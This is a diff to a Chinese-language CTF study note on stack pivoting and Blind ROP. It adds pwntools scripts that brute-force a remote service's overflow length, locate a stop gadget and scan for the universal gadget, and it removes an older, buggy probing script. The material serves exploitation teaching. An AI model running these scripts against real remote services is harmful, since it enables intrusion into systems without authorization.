@@ -58,6 +58,19 @@ LEAVE
 
 
 
+要实现栈迁移，需要至少执行两次写入操作
+
+一次用于向可读写内存区（比如.bss段）写入rop链
+
+第二次用于触发栈溢出，将esp寄存器指向上一步写入的rop链所在的内存区
+
+同时还需要执行两次leave ret操作
+
+一次用于触发栈溢出修改后的函数ret地址
+
+一次用于将ebp esp寄存器指向rop链的内存区完成迁移动作
+
+
 
 
 
@@ -99,6 +112,11 @@ LEAVE
 
 就是没有给出文件给你，只给了远程服务器给你
 
+必要条件：
+
+1. 目标程序存在一个栈溢出漏洞，并且我们知道怎样去触发它
+2. 目标进程在崩溃后会立即重启，并且重启后进程被加载的地址不变，这样即使目标机器开启了 ASLR 也没有影响。
+
 
 
 - 枚举，判断栈溢出长度
@@ -135,28 +153,105 @@ Blind ROP
 
 
 
+做题步骤：
 
 
-一个简单判断栈溢出长度的程序
+
+崩溃意味着找到了覆盖返回地址
 
 ```python
-from pwn import *
-i=1
-while 1:
-    try:
-        p=remote("127.0.0.1",9999)
-        p.recvuntil("WelCome my friend,Do you know password?\n")
-        p.send('a'*i)
-        data=p.recv()
-        p.close()
-        if not data.startwith('No password'):
-            return i-1
-        else:
-            return i+1
-	execpt EOFEror:
-        p.close()
-        return i-1
-size=getsize()
-print "size is [%s]"%size
+def get_buffer_size():
+    for i in range(100):
+        payload = "A"
+        payload += "A"*i
+        buf_size = len(payload) - 1
+        try:
+            p = remote('127.0.0.1', 10001)
+            p.recvline()
+            p.send(payload)
+            p.recv()
+            p.close()
+            log.info("bad: %d" % buf_size)
+        except EOFError as e:
+            p.close()
+            log.info("buffer size: %d" % buf_size)
+            return buf_size
 ```
+
+
+
+找到覆盖返回地址的长度之后，就要寻找通用gadget了，因为只知道缓冲区溢出长度也是不行的，因为覆盖的地址大概率不是而合法的，需要找到一个能够使程序正常返回的地址，称为stop gadget
+
+```python
+def get_stop_addr(buf_size):
+    addr = 0x400000
+    while True:
+        sleep(0.1)
+        addr += 1
+        payload = "A"*buf_size
+        payload += p64(addr)
+        try:
+            p = remote('127.0.0.1', 10001)
+            p.recvline()
+            p.sendline(payload)
+            p.recvline()
+            p.close()
+            log.info("stop address: 0x%x" % addr)
+            return addr
+        except EOFError as e:
+            p.close()
+            log.info("bad: 0x%x" % addr)
+        except:
+            log.info("Can't connect")
+            addr -= 1
+```
+
+
+
+找到一个就可以了，一般是从`0x400000` 开始找，找到了之后程序还是一样崩溃，但是那些正常返回的地址会通过stop gadget进入被挂起的状态，在这个基础上寻找其他可利用的gadget。一般开始搜索的地址从上面获取的stop gadget地址开始搜索就可以了。
+
+```python
+def get_gadgets_addr(buf_size, stop_addr):
+    addr = stop_addr
+    while True:
+        sleep(0.1)
+        addr += 1
+        payload = "A"*buf_size
+        payload += p64(addr)
+        payload += p64(1) + p64(2) + p64(3) + p64(4) + p64(5) + p64(6)
+        payload += p64(stop_addr)
+        try:
+            p = remote('127.0.0.1', 10001)
+            p.recvline()
+            p.sendline(payload)
+            p.recvline()
+            p.close()
+            log.info("find address: 0x%x" % addr)
+            try: # check
+                payload = "A"*buf_size
+                payload += p64(addr)
+                payload += p64(1) + p64(2) + p64(3) + p64(4) + p64(5) + p64(6)
+                p = remote('127.0.0.1', 10001)
+                p.recvline()
+                p.sendline(payload)
+                p.recvline()
+                p.close()
+                log.info("bad address: 0x%x" % addr)
+            except:
+                p.close()
+                log.info("gadget address: 0x%x" % addr)
+                return addr
+        except EOFError as e:
+            p.close()
+            log.info("bad: 0x%x" % addr)
+        except:
+            log.info("Can't connect")
+            addr -= 1
+```
+
+
+
+得到通用gadget，就可以得到`pop rdi;ret` 的地址了，就是 `gadget address + 9`
+
+然后就是使用puts函数来dump内存，仅仅需要一个参数
 
